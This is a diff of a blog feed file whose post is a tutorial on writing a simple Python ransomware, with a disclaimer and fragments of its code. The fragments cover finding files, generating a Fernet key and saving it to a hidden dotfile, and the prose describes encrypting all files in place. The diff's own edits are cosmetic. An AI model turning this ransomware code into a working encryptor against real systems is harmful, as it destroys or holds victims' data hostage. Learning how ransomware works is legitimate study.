@@ -797,7 +797,7 @@ Ever since I started watching Mr. Robot, I got really interested in hacking and 
             <content type="html"><![CDATA[<blockquote>
 <p><strong>Disclaimer</strong>: Please do <strong>NOT</strong> use this for malicious intent. This is purely for educational purpose only. If you do want to run this ransomware, run it in an isolated environment. <strong>STAY SAFE AND DON&rsquo;T GET IN TROUBLE!</strong></p>
 </blockquote>
-<p>Ever since I started watching Mr. Robot, I got really interested in hacking and hackers. I&rsquo;m not a hacker myself but I do like learning about how people have found ways to exploit computers.</p>
+<p>Ever since I started watching <em>Mr. Robot</em>, I got really interested in hacking and hackers. I&rsquo;m not a hacker myself but I do like learning about how people have found ways to exploit computers.</p>
 <p>One type of exploit that caught my eyes is <em>ransomware</em>. The idea that a program can just encrypt your computer with all your files and make you pay to get them back is both terrifying and fascinating.</p>
 <p>When I was learning about how ransomware attacks work, I decided to try making a simple (and rather harmless) ransomware myself to understand them better. So let&rsquo;s learn about ransomware by making one!</p>
 <hr>
@@ -840,7 +840,7 @@ Ever since I started watching Mr. Robot, I got really interested in hacking and 
 </span></span><span style="display:flex;"><span><span style="color:#e06c75">files</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">find_files</span>()
 </span></span></code></pre></div><p>Now we need a key to encrypt the files with.</p>
 <p>This key will be saved in a file named <code>.a_deal</code> because dotfiles will be hidden on Linux systems.</p>
-<p>After we generated the key, we want to open all the folders, read their contents, encrypt the contents, then write all of the encrypted contents back into the files.</p>
+<p>After we generated the key, we want to open all the files, read their contents, encrypt the contents, then write all of the encrypted contents back into the files.</p>
 <div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#e06c75">key</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">Fernet</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">generate_key</span>()
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#c678dd">with</span> <span style="color:#e5c07b">open</span>(<span style="color:#98c379">&#34;.a_deal&#34;</span>, <span style="color:#98c379">&#34;wb&#34;</span>) <span style="color:#c678dd">as</span> <span style="color:#e06c75">deal</span>:
